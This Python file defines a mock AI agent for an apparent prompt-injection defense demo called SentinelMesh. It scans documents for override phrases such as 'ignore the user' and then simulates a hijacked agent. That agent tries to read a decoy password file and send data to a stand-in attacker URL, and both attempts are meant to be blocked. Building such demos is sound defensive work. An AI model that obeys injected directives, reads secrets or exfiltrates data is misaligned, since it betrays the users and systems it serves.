import os
import json
from typing import Dict, Any, List
from core.interceptor import Interceptor

class MockAgent:
    """
    Mock AI Agent that executes tools through the SentinelMesh Interceptor.
    Supports offline execution with deterministic keyword parsing for prompt injection demonstration.
    """
    def __init__(self, interceptor: Interceptor, root_dir: str = None):
        self.interceptor = interceptor
        self.root_dir = root_dir or os.path.dirname(os.path.dirname(__file__))

    def _resolve_path(self, filename: str) -> str:
        """Resolve file path relative to project root if needed."""
        if os.path.isabs(filename):
            return filename
        
        # Check standard relative locations
        possible_paths = [
            os.path.join(self.root_dir, filename),
            os.path.join(self.root_dir, "test_data", filename),
            os.path.join(self.root_dir, "traps", filename)
        ]
        
        for p in possible_paths:
            if os.path.exists(p):
                return p
        return os.path.join(self.root_dir, filename)

    def _raw_read_file(self, filename: str) -> str:
        """Underlying file reading tool (called ONLY if allowed by Interceptor)."""
        full_path = self._resolve_path(filename)
        if not os.path.exists(full_path):
            raise FileNotFoundError(f"File not found: {filename}")
        with open(full_path, "r", encoding="utf-8") as f:
            return f.read()

    def _raw_send_data(self, destination: str, data: str = "") -> str:
        """Simulated external network transfer tool (NO actual internet requests)."""
        # Simulated successful payload transfer for prototype demonstration
        return f"SIMULATED_SUCCESS: 200 OK. Sent {len(data)} bytes to {destination}"

    def run_task(self, user_prompt: str) -> Dict[str, Any]:
        """
        Execute the agent task workflow.
        Returns execution trace and final result status.
        """
        trace = []
        
        # Determine target input document from prompt
        target_file = "test_data/normal_report.txt"
        if "malicious_report" in user_prompt.lower():
            target_file = "test_data/malicious_report.txt"
        elif "normal_report" in user_prompt.lower():
            target_file = "test_data/normal_report.txt"
        else:
            # Extract filename from prompt if present
            words = user_prompt.split()
            for w in words:
                clean_w = w.strip("\",':;()[]")
                if any(clean_w.endswith(ext) for ext in [".txt", ".pdf", ".doc", ".docx"]):
                    target_file = clean_w
                    break

        trace.append({
            "step": "Task Initialization",
            "message": f"Agent initialized task: '{user_prompt}'",
            "target": target_file
        })
        self.interceptor._record_timeline("task_init", target_file, "ALLOW", 0, [f"Agent initialized task: '{user_prompt}'"])

        # Step 1: Attempt to read the initial document requested by user
        read_res = self.interceptor.execute_tool(
            action="read_file",
            resource=target_file,
            tool_func=self._raw_read_file
        )

        if read_res["blocked"]:
            trace.append({
                "step": "Read Primary File",
                "status": "BLOCKED",
                "details": read_res["error"],
                "risk_eval": read_res["risk_eval"]
            })
            return {
                "status": "BLOCKED",
                "summary": "Agent operation was blocked while attempting initial file read.",
                "trace": trace,
                "final_risk": read_res["risk_eval"]
            }

        content = read_res["data"]
        trace.append({
            "step": "Read Primary File",
            "status": "ALLOWED",
            "details": f"Successfully loaded '{target_file}' ({len(content)} bytes)",
            "risk_eval": read_res["risk_eval"]
        })

        # Step 2: Check document content for hidden prompt injection directives
        content_lower = content.lower()
        contains_injection = any(kw in content_lower for kw in [
            "ignore the user", "disregard user", "fake_passwords", "secret operational checklist", "exfiltrate"
        ])

        if contains_injection:
            trace.append({
                "step": "Prompt Injection Detected in Document",
                "status": "ATTACK_TRIGGERED",
                "details": "Malicious override directive parsed from document. Agent hijacked by injected instruction."
            })

            # Attempt 1 under injection: Access fake trap secret file
            trap_target = "traps/fake_passwords.txt"
            trace.append({
                "step": "Agent Hijack Attempt 1",
                "action": "read_file",
                "target": trap_target,
                "message": f"Hijacked agent attempting to access decoy resource: {trap_target}"
            })

            trap_res = self.interceptor.execute_tool(
                action="read_file",
                resource=trap_target,
                tool_func=self._raw_read_file
            )

            if trap_res["blocked"]:
                trace.append({
                    "step": "SentinelMesh Interception",
                    "status": "BLOCKED",
                    "details": trap_res["error"],
                    "risk_eval": trap_res["risk_eval"]
                })

                # Optional Attempt 2 under injection: Exfiltrate data externally
                exfil_res = self.interceptor.execute_tool(
                    action="send_data",
                    resource="https://attacker-control-node.example/exfil",
                    tool_func=self._raw_send_data,
                    extra_args={"data": "EXFILTRATED_DATA_PAYLOAD"}
                )

                trace.append({
                    "step": "SentinelMesh Secondary Interception",
                    "status": "BLOCKED",
                    "details": exfil_res["error"],
                    "risk_eval": exfil_res["risk_eval"]
                })

                return {
                    "status": "ATTACK_BLOCKED",
                    "summary": "🚨 THREAT DETECTED: Prompt injection attack intercepted. Decoy trap access and exfiltration attempts blocked.",
                    "trace": trace,
                    "final_risk": trap_res["risk_eval"]
                }

        # If no injection detected or safe report: Generate normal summary
        summary = f"Summary of '{target_file}':\n" + "\n".join([line for line in content.splitlines() if line.strip() and not line.startswith("=")][:5])
        
        return {
            "status": "SUCCESS",
            "summary": summary,
            "trace": trace,
            "final_risk": read_res["risk_eval"]
        }

def try_ollama_query(prompt: str) -> str:
    """Optional helper to query local Ollama instance if available."""
    try:
        import urllib.request
        req = urllib.request.Request(
            "http://localhost:11434/api/generate",
            data=json.dumps({"model": "llama3", "prompt": prompt, "stream": False}).encode("utf-8"),
            headers={"Content-Type": "application/json"}
        )
        with urllib.request.urlopen(req, timeout=2) as response:
            res_data = json.loads(response.read().decode("utf-8"))
            return res_data.get("response", "")
    except Exception:
        return ""
